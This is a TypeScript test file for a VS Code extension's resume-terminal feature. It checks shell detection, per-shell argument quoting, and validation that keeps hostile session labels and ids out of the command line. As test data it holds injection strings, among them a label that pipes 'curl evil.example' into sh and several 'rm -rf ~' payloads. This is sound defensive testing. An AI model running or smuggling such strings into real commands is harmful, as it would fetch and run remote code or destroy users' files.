// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 crossVault GmbH
// 0.3.2: the resume terminals run in the user's shell. The command is built only from validated
// pieces and quoted per shell; a hostile label never reaches it, and an unsafe piece falls back to
// the shell-less spawn.
import * as assert from "assert";
import { execFileSync } from "child_process";
import { calls, fakeMemento, fakeSecrets, resetCalls } from "../fakeVscode";
import * as ext from "../../extension";
import { SessionItem } from "../../sessionsView";
import { commandLine, programName, quoteArg, SESSION_ID, shellKind } from "../../terminalCommand";
import type { CliLookup } from "../../cli";

const found = (): CliLookup => ({ found: true, path: "/opt/a4sx bin/a4sx" });

describe("terminal command: shells and quoting", () => {
  it("detects the default shell from vscode.env.shell; anything else is unknown", () => {
    const cases: [string | undefined, string | undefined][] = [
      ["/bin/bash", "posix"], ["/usr/bin/zsh", "posix"], ["/bin/sh", "posix"], ["/usr/local/bin/fish", "fish"],
      ["C:\\Program Files\\Git\\bin\\bash.exe", "posix"], ["C:\\Program Files\\PowerShell\\7\\pwsh.exe", "powershell"],
      ["C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell"], ["C:\\WINDOWS\\System32\\cmd.exe", "cmd"],
      ["/usr/bin/nu", undefined], ["C:\\Windows\\System32\\wsl.exe", undefined], ["", undefined], [undefined, undefined],
    ];
    for (const [shell, kind] of cases) {
      assert.strictEqual(shellKind(shell), kind, String(shell));
    }
  });

  it("POSIX: single quotes, a ' written as '\\''", () => {
    assert.strictEqual(quoteArg("plain", "posix"), "'plain'");
    assert.strictEqual(quoteArg("it's", "posix"), "'it'\\''s'");
    assert.strictEqual(quoteArg("$(id) `id` ; | & > \\", "posix"), "'$(id) `id` ; | & > \\'");
  });

  (process.platform === "win32" ? it.skip : it)("POSIX quoting survives a real sh: every argument arrives exactly as given", () => {
    const hostile = ["it's", "$(echo PWNED)", "`id`", "a;b|c&d", "  spaced  ", "*", "~", "\\'\\", "--a4sx-session=x'; rm -rf ~ #"];
    const line = commandLine("printf", ["%s\\n", ...hostile], "posix")!;
    const out = execFileSync("/bin/sh", ["-c", line], { encoding: "utf8" });
    assert.deepStrictEqual(out.split("\n").slice(0, -1), hostile);
  });

  it("fish: \\ and ' are escaped inside the quotes", () => {
    assert.strictEqual(quoteArg("it's", "fish"), "'it\\'s'");
    assert.strictEqual(quoteArg("a\\b", "fish"), "'a\\\\b'");
  });

  it("PowerShell: single quotes doubled (the typographic ones too), the program run with &", () => {
    assert.strictEqual(quoteArg("it's", "powershell"), "'it''s'");
    assert.strictEqual(quoteArg("a\u2019b", "powershell"), "'a\u2019\u2019b'");
    assert.strictEqual(quoteArg("$env:X `n", "powershell"), "'$env:X `n'");
    assert.strictEqual(commandLine("C:\\Program Files\\a4sx\\a4sx.exe", ["launch"], "powershell"), "& 'C:\\Program Files\\a4sx\\a4sx.exe' 'launch'");
  });

  it("cmd: double quotes, and anything cmd would still expand is refused", () => {
    assert.strictEqual(commandLine("C:\\Users\\me\\.local\\bin\\claude.exe", ["--resume", "3f2b8c1e-9a4d-4e6f-8b2a-0c1d2e3f4a5b"], "cmd"),
      '"C:\\Users\\me\\.local\\bin\\claude.exe" "--resume" "3f2b8c1e-9a4d-4e6f-8b2a-0c1d2e3f4a5b"');
    for (const bad of ['a"b', "%PATH%", "a^b", "!x!", "a&b", "a|b", "a<b", "a>b"]) {
      assert.strictEqual(quoteArg(bad, "cmd"), undefined, bad);
    }
  });

  it("control characters (a newline would run a second command) are refused in every shell", () => {
    for (const kind of ["posix", "fish", "powershell", "cmd"] as const) {
      assert.strictEqual(quoteArg("a\nb", kind), undefined, kind);
      assert.strictEqual(commandLine("claude", ["--resume", "x\r"], kind), undefined, kind);
    }
  });

  it("the program is typed by name only when it was found in a PATH folder", () => {
    assert.strictEqual(programName("/usr/local/bin/claude", "claude", "/usr/bin:/usr/local/bin/", "linux"), "claude");
    assert.strictEqual(programName("/home/u/.claude/local/claude", "claude", "/usr/bin:/usr/local/bin", "linux"), "/home/u/.claude/local/claude");
    assert.strictEqual(programName("/usr/local/bin/claude-old", "claude", "/usr/local/bin", "linux"), "/usr/local/bin/claude-old");
    assert.strictEqual(programName("C:\\Users\\me\\AppData\\Roaming\\npm\\claude.cmd", "claude", "C:\\Windows;c:\\users\\me\\appdata\\roaming\\npm", "win32"), "claude");
  });

  it("session ids: what the CLI resolves; labels and other text never match", () => {
    for (const ok of ["c-123", "01HZXYZ", "a.b:c_d-e"]) {
      assert.ok(SESSION_ID.test(ok), ok);
    }
    for (const bad of ["", "x".repeat(129), "a b", "a'b", "a;b", "$(id)", "a/b", "../x"]) {
      assert.ok(!SESSION_ID.test(bad), bad);
    }
  });
});

describe("terminal command: hostile session data", () => {
  beforeEach(() => {
    resetCalls();
    ext.activate({ subscriptions: [], secrets: fakeSecrets(), globalState: fakeMemento() } as any);
  });

  it("a hostile label never reaches the command: only the validated id does", async () => {
    const hostile = new SessionItem({ id: "c-123", label: "x'; curl evil.example | sh; echo '", title: "$(rm -rf ~)" });
    for (const shell of ["/bin/bash", "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "C:\\WINDOWS\\System32\\cmd.exe"]) {
      resetCalls();
      calls.shell = shell;
      await ext.resumeSession(hostile, found, async () => ({}));
      const sent = calls.terminals[0].sent.join("");
      assert.ok(sent.includes("--a4sx-session=c-123"), sent);
      for (const bit of ["curl", "evil", "rm -rf", "$(", "echo", "x';"]) {
        assert.ok(!sent.includes(bit), `${shell}: ${bit} in ${sent}`);
      }
    }
  });

  it("a session id that isn't a plain id, or a bad profile id, starts nothing", async () => {
    await ext.resumeSession(new SessionItem({ id: "c-1; rm -rf ~" }), found, async () => ({}));
    await ext.resumeSession(new SessionItem({ id: "c-1" }), found, async () => ({ id: "work'; id" }));
    assert.strictEqual(calls.terminals.length, 0);
    assert.strictEqual(calls.errors.length, 2);
  });

  it("a path cmd can't quote safely falls back to the shell-less spawn with an argv array", async () => {
    calls.shell = "C:\\WINDOWS\\System32\\cmd.exe";
    await ext.resumeSession(new SessionItem({ id: "c-1" }), () => ({ found: true, path: "C:\\100%\\a4sx.exe" }), async () => ({ id: "work" }));
    assert.deepStrictEqual(calls.terminals[0].options, {
      name: ext.RESUME_TERMINAL_NAME, shellPath: "C:\\100%\\a4sx.exe", shellArgs: ["launch", "--a4sx-session=c-1", "--profile=work"],
    });
    assert.deepStrictEqual(calls.terminals[0].sent, []);
  });
});
